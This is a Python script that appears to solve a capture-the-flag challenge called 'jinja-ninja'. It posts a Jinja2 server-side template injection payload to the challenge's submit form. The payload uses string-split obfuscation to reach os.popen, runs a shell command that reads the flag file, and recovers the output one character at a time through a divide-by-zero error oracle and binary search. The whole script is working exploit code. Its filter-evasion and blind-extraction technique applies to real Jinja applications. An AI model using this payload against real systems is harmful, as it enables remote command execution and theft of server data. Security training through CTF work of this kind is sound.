import requests
import math
import sys

base_url = 'https://jinja-ninja.secchallenge.crysys.hu'


def solve():
    flag = ''

    while not flag.endswith('}'):
        flag += get_char_at('cat fla*', len(flag))

    return flag


def is_char_at_less_than(cmd, ich, ch):
    template = '''
        {% for x in ().__class__.__base__.__subclasses__() %}
            {% if "warni"+"ng" in x.__name__ %}
                {% if x()._module.__builtins__['__imp' + 'ort__']('o'+'s').popen("''' + cmd + '''").read()[''' + str(ich) + '''] < "''' + ch + '''" %}
                    {% for a in [1/0] %}
                    {% endfor %}
                {% endif %}
            {% endif %}
        {% endfor %}
    '''

    resp = requests.post(f'{base_url}/submit', data={
        "name": template,
        "email": "",
        "faction": "",
        "profession": "",
        "preferences": "",
    }).text

    return 'Something went wrong' in resp


def get_char_at(cmd, ich):
    lo = 19
    hi = 127

    while hi - lo > 1:
        m = math.floor((hi + lo) / 2)

        sys.stdout.write(chr(m))
        sys.stdout.write('\u001B[1D')
        sys.stdout.flush()
        if is_char_at_less_than(cmd, ich, chr(m)):
            hi = m
        else:
            lo = m

    sys.stdout.write(chr(lo))
    sys.stdout.flush()
    return chr(lo)


if __name__ == "__main__":
    print(solve())
